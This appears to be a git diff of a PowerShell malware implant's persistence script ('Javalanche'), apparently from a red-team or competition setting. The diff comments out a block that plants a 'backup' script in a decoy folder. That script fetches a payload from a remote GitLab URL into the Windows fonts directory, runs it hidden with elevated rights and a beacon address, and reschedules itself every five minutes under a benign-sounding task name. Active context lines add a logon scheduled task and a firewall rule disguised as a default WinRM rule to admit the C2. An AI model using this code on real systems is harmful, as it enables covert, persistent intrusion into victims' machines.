@@ -39,24 +39,24 @@ $action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument "-Executio
 $trigger = New-ScheduledTaskTrigger -AtLogOn
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "Java-Init"
 
-# Create the backup script
-# The backup script will check to see if the main payload exists.
-# If it doesn't this script will redownload the main payload, and start a new process for it
-if(!(Test-Path "C:\Program Files (x86)\Webkinz")){
-    New-Item -ItemType "Directory" -Path "C:\Program Files (x86)\Webkinz"
-}
-if(!(Test-Path "C:\Program Files (x86)\Webkinz\backup.ps1")){
-    New-Item -ItemType "File" -Path "C:\Program Files (x86)\Webkinz\backup.ps1"
-    $backupCommands = "if(!(Test-Path C:\Windows\fonts\Javalanche.ps1)){"
-    $backupCommands += "wget -o C:\Windows\fonts\Javalanche.ps1 `"https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/windowsPayload.sh?ref_type=heads`";"
-    $backupCommands += "Start-Process -FilePath `"powershell.exe`" -ArgumentList `"set-executionpolicy -ExecutionPolicy Unrestricted -Scope Process -Force;& C:\Windows\fonts\Javalanche.ps1 -BeaconIPAddress $($beaconIPAddress)`" -WindowStyle Hidden -Verb RunAs"
-    $backupCommands | Out-File "C:\Program Files (x86)\Webkinz\backup.ps1"
-}
+# # Create the backup script
+# # The backup script will check to see if the main payload exists.
+# # If it doesn't this script will redownload the main payload, and start a new process for it
+# if(!(Test-Path "C:\Program Files (x86)\Webkinz")){
+#     New-Item -ItemType "Directory" -Path "C:\Program Files (x86)\Webkinz"
+# }
+# if(!(Test-Path "C:\Program Files (x86)\Webkinz\backup.ps1")){
+#     New-Item -ItemType "File" -Path "C:\Program Files (x86)\Webkinz\backup.ps1"
+#     $backupCommands = "if(!(Test-Path C:\Windows\fonts\Javalanche.ps1)){"
+#     $backupCommands += "wget -o C:\Windows\fonts\Javalanche.ps1 `"https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/windowsPayload.sh?ref_type=heads`";"
+#     $backupCommands += "Start-Process -FilePath `"powershell.exe`" -ArgumentList `"set-executionpolicy -ExecutionPolicy Unrestricted -Scope Process -Force;& C:\Windows\fonts\Javalanche.ps1 -BeaconIPAddress $($beaconIPAddress)`" -WindowStyle Hidden -Verb RunAs"
+#     $backupCommands | Out-File "C:\Program Files (x86)\Webkinz\backup.ps1"
+# }
 
-# Create Scheduled task for the backup script to check for the main payload every 5 minutes
-$action = New-ScheduledTaskAction -Execute "C:\Program Files (x86)\Webkinz\backup.ps1"
-$trigger = New-ScheduledTaskTrigger -Daily -At 9am -RepetitionInterval (New-TimeSpan -Minutes 5)
-Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "BackupImportantFiles"
+# # Create Scheduled task for the backup script to check for the main payload every 5 minutes
+# $action = New-ScheduledTaskAction -Execute "C:\Program Files (x86)\Webkinz\backup.ps1"
+# $trigger = New-ScheduledTaskTrigger -Daily -At 9am -RepetitionInterval (New-TimeSpan -Minutes 5)
+# Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "BackupImportantFiles"
 
 # Set up Firewall rules to make sure the C2 can communicate with the client
 netsh adv f a r n="WinRM Default Rule" dir=in act=allow prof=any prot=tcp localport=5985,5986
